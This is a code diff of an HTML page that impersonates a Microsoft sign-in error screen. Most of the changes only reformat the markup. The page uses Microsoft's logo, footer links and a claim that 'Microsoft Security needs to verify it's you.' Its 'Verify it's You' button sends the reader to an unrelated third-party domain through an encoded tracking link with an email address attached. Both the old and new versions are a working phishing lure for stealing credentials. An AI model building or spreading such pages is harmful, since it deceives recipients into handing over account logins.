@@ -1,4 +1,3 @@
-
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html dir="ltr" lang="en">
 
@@ -8,20 +7,20 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="-1">
-    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin>
+    <link rel="preconnect" href="https://aadcdn.msauth.net">
     <meta http-equiv="x-dns-prefetch-control" content="on">
     <link rel="dns-prefetch" href="//aadcdn.msauth.net">
     <link rel="dns-prefetch" href="//aadcdn.msftauth.net">
-    <meta name="PageID" content="ConvergedDownLevelError" />
-    <meta name="SiteID" content="" />
-    <meta name="ReqLC" content="1033" />
-    <meta name="LocLC" content="en-US" />
-    <link rel="shortcut icon" href="favicon.ico" />
-    <link data-loader="cdn" crossorigin="anonymous" href="lincu.css" rel="stylesheet" />
-
+    <meta name="PageID" content="ConvergedDownLevelError">
+    <meta name="SiteID" content="">
+    <meta name="ReqLC" content="1033">
+    <meta name="LocLC" content="en-US">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link data-loader="cdn" href="lincu.css" rel="stylesheet">
     <style>
         /* Global Reset and Font */
-        body, html {
+        body,
+        html {
             height: 100%;
             margin: 0;
             font-family: "Segoe UI", Arial, sans-serif;
@@ -74,7 +73,8 @@
 
         /* Microsoft Blue Button */
         button {
-            background-color: #0078d4; /* Microsoft Blue */
+            background-color: #0078d4;
+            /* Microsoft Blue */
             color: white;
             padding: 12px 30px;
             border: none;
@@ -122,29 +122,15 @@
     <div class="container">
         <div class="outer">
             <div class="inner">
-                <!-- High-Resolution Microsoft logo -->
-                <img class="logo" src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen-1920x706.jpg" alt="Microsoft Logo" />
-                <div class="text-title">We can’t process your request</div>
+                <!-- High-Resolution Microsoft logo -->&nbsp;<img class="logo" src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen-1920x706.jpg" alt="Microsoft Logo" style="margin: 0 auto; display: block; ">
+                <div class="text-title">We can&rsquo;t process your request</div>
                 <div class="form-group">For your protection.</div>
-                <div class="form-group">Microsoft Security needs to verify it's you.</div>
-                <!-- Button that triggers a link -->
-                <a href=" https://www.lkggroup.lkg-group.com/n/?c3Y9bzM2NV8xX3ZvaWNlJnJhbmQ9Um5kclJUVT0mdWlkPVVTRVIyODEwMjAyNFU0ODEwMjgxNg==N0123N[EMAIL]
-" target="_blank">
-                    <button>Verify it’s You</button>
-                </a>
+                <div class="form-group">Microsoft Security needs to verify it&apos;s you.</div><!-- Button that triggers a link --> <a href="%20https://www.lkggroup.lkg-group.com/n/?c3Y9bzM2NV8xX3ZvaWNlJnJhbmQ9Um5kclJUVT0mdWlkPVVTRVIyODEwMjAyNFU0ODEwMjgxNg==N0123N[EMAIL]" target="_blank">&nbsp;<button>Verify it&rsquo;s You</button>&nbsp;</a>
             </div>
         </div>
-    </div>
-
-    <!-- Footer with Microsoft links -->
+    </div><!-- Footer with Microsoft links -->
     <div class="footer">
-        <div id="footerLinks" class="footerNode text-secondary">
-            <a href="https://www.microsoft.com/en-us/servicesagreement" target="_blank">Terms of Use</a>
-            <a href="https://privacy.microsoft.com/en-us/" target="_blank">Privacy &amp; Cookies</a>
-            <a href="https://support.microsoft.com/en-us" target="_blank">Support</a>
-            <a href="https://www.microsoft.com/en-us/accessibility" target="_blank">Accessibility</a>
-            <a href="https://account.microsoft.com" target="_blank">Account</a>
-        </div>
+        <div id="footerLinks" class="footerNode text-secondary"><a href="https://www.microsoft.com/en-us/servicesagreement" target="_blank">Terms of Use</a> <a href="https://privacy.microsoft.com/en-us/" target="_blank">Privacy &amp; Cookies</a> <a href="https://support.microsoft.com/en-us" target="_blank">Support</a> <a href="https://www.microsoft.com/en-us/accessibility" target="_blank">Accessibility</a> <a href="https://account.microsoft.com" target="_blank">Account</a></div>
     </div>
 </body>
 
